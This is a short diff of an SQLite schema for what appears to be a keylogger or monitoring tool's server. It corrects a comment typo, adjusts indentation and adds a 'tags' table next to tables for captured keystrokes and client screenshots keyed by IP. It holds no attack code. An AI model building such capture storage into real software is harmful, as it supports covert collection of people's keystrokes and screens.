@@ -18,10 +18,10 @@ CREATE TABLE `timestamps` (
 ) WITHOUT ROWID;
 
 
--- Keystoke data that we have captured
+-- Keystroke data that we have captured
 CREATE TABLE `keystrokes` (
 	`ip`        TEXT,
-        `keystroke` TEXT,
+  `keystroke` TEXT,
 	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
         PRIMARY KEY(`time`)
 ) WITHOUT ROWID;
@@ -29,8 +29,15 @@ CREATE TABLE `keystrokes` (
 -- Store screenshots sent up from the client
 CREATE TABLE `files` (
 	`ip`        TEXT,
-        `filename`  TEXT,
+  `filename`  TEXT,
 	`time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,
         PRIMARY KEY(`time`)
 ) WITHOUT ROWID;
 
+-- Store screenshots sent up from the client
+CREATE TABLE `tags` (
+	`id`				INTEGER,
+	`ip`        TEXT,
+  `tag`				TEXT,
+        PRIMARY KEY(`id` ASC)
+) WITHOUT ROWID;
